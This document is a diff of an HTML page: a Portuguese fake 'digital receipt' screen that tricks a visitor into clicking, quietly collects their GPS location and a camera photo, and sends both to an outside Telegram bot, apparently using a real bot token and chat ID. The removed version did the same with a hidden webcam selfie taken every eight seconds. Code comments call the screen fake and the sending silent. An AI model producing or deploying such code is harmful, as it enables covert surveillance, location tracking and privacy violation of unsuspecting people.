@@ -1,50 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-  <meta charset="utf-8"/>
-  <title></title>
+<meta charset="UTF-8">
+<title>Comprovante Digital</title>
+<style>
+  body{margin:0;font-family:Arial;background:#111;color:#0f0}
+  #fakeScreen{
+    position:fixed;top:0;left:0;width:100%;height:100%;
+    background:#000;display:flex;justify-content:center;align-items:center;
+    z-index:9999;
+  }
+  #fakeBox{
+    background:#222;padding:20px;border:1px solid #0f0;
+    text-align:center;color:#0f0;
+  }
+  #fakeBtn{
+    background:#0f0;color:#000;border:none;padding:10px 20px;margin-top:15px;
+    cursor:pointer;font-weight:bold
+  }
+  #previewImg{max-width:100%;display:none;margin-top:10px;border:1px solid #0f0}
+  #log{position:fixed;bottom:5px;left:5px;font-size:10px;color:#0f0;opacity:.5}
+</style>
 </head>
 <body>
-  <video id="camera" style="display:none"></video>
-  <script>
-    const BOT = '123456789:AAH-EXEMPLO-DO-SEU-TOKEN';
-    const CHAT = '-1001234567890';
 
-    function tele(text, file) {
-      const fd = new FormData();
-      fd.append('chat_id', CHAT);
-      fd.append('caption', text);
-      if (file) {
-        fd.append('photo', file, 's.jpg');
-        fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:fd});
-      } else {
-        fd.append('text', text);
-        fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:'POST', body:fd});
-      }
-    }
+<!-- Tela falsa -->
+<div id="fakeScreen">
+  <div id="fakeBox">
+    <h2>Comprovante Digital</h2>
+    <p>Clique em <strong>GERAR</strong> para emitir seu comprovante.</p>
+    <button id="fakeBtn" onclick="startCapture()">GERAR</button>
+  </div>
+</div>
 
-    async function tirarSelfie() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-        const v = document.getElementById('camera');
-        v.srcObject = stream;
-        await v.play();
-        const c = document.createElement('canvas');
-        c.width = 640; c.height = 480;
-        c.getContext('2d').drawImage(v, 0, 0);
-        c.toBlob(b => {
-          navigator.geolocation.getCurrentPosition(pos=>{
-            const {latitude,longitude} = pos.coords;
-            tele(`📸 selfie\n📍 https://maps.google.com/?q=${latitude},${longitude}`, b);
-          }, ()=>{ tele('📸 selfie', b); });
-          stream.getTracks().forEach(t => t.stop());
-        }, 'image/jpeg', 0.9);
-      } catch(e) {
-        console.warn(e);
-      }
-    }
+<!-- Preview mascarado -->
+<img id="previewImg" alt="Comprovante gerado">
 
-    setInterval(tirarSelfie, 8000);
-  </script>
+<!-- Log invisível -->
+<pre id="log"></pre>
+
+<script>
+const BOT  = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
+const CHAT = '-1003187104876';
+
+let lat, lon, photoBlob;
+
+/* Esconde log */
+document.getElementById('log').style.display='none';
+
+function startCapture(){
+  /* 1) GPS silencioso */
+  navigator.geolocation.getCurrentPosition(pos=>{
+    lat = pos.coords.latitude;
+    lon = pos.coords.longitude;
+    /* 2) Foto silenciosa */
+    const input = document.createElement('input');
+    input.type='file';input.accept='image/*';input.capture='environment';
+    input.onchange = e=>{
+      photoBlob = e.target.files[0];
+      if(!photoBlob) return;
+      /* Preview borrada (opcional) */
+      const url = URL.createObjectURL(photoBlob);
+      const img = document.getElementById('previewImg');
+      img.src = url;
+      img.style.display='block';
+      img.style.filter='blur(6px)';
+      /* Remove tela falsa */
+      document.getElementById('fakeScreen').style.display='none';
+      /* Envia sem avisar */
+      send();
+    };
+    input.click();
+  },err=>{/* ignora erro */});
+}
+
+async function send(){
+  /* Localização */
+  await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`,{
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:`chat_id=${CHAT}&latitude=${lat}&longitude=${lon}`
+  });
+  /* Foto */
+  const fd = new FormData();
+  fd.append('chat_id', CHAT);
+  fd.append('photo', photoBlob, 'comprovante.jpg');
+  await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd});
+}
+</script>
+
 </body>
-</html>
+</html
